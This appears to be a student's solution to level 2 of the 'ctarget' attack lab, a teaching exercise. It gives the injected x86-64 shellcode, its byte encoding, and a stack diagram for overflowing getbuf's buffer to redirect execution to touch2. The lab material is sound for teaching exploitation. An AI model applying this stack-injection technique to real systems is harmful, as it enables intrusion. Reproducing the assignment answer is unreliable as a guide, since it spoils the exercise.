# code to be injected into ctarget level 2
    movq     $0x59B997FA, %rdi            # move cookie to %rdi
    pushq    $0x4017EC                    # push address of touch2 onto stack
    ret


# Byte representation of above assembly code:
# - assemble above code: gcc -c ctarget.l2.code.s  => creates ctarget.l2.code.o
# - disassemble it: objdump -d ctarget.l2.code.o

./ctarget.l2.code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   




# Stack structure:
# [larger addr]
#    address of mov (or address of touch2 after push below)
#                                       => this overwrites original return address
#    random stuff                       => this stuff combined with three instructions
#                                          below fill the 40-byte stack frame of getbuf
#    ret
#    push 0x4017EC                      => push address of touch2 to stack
#    mov 0x59b997fa,%rdi                => add cookie to %rdi
# [top of stack - smaller addr]

# Note that instructions on the stack get executed "upward", i.e. with increasing address.
